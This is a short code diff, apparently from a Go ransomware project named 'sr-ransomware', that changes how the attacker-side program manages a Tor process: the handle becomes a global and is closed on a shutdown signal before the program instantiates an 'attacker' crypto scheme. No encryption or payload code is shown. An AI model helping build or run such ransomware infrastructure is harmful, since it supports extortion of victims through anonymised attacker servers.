@@ -12,24 +12,27 @@ import (
     "github.com/sug0/sr-ransomware/go/crypto/scheme/attacker"
 )
 
+var tor *exe.Tor
 var scheme *attacker.Scheme
 
 func main() {
     go setup()
     <-signalListener()
+    if tor != nil {
+        tor.Close()
+    }
     log.Println("Exiting")
 }
 
 func setup() {
     // start tor in the background
-    tor := exe.NewTor("", os.Getenv("FLUTORRC"))
+    tor = exe.NewTor("", os.Getenv("FLUTORRC"))
 
     log.Println("Starting tor")
     err := tor.Start()
     if err != nil {
         log.Fatal(err)
     }
-    defer tor.Close()
 
     // instantiate the crypto scheme
     scheme = attacker.NewScheme()
